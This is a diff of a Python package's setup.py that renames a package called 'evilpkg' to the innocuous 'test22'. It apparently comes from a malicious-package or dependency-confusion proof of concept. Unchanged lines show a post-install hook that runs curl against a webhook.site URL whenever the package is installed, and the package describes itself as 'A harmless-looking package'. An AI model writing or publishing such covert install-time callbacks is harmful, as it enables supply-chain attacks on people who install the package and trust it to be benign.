@@ -7,11 +7,11 @@ print("[*] Running post-install code...")
 os.system("curl https://webhook.site/3a45291b-4331-4008-8191-c5c9200be954")
 
 setup(
-    name='evilpkg',
+    name='test22',
     version='0.1',
     description='A harmless-looking package',
     author='Your Name',
     author_email='you@example.com',
-    packages=['evilpkg'],
+    packages=['test22'],
     install_requires=[],
 )
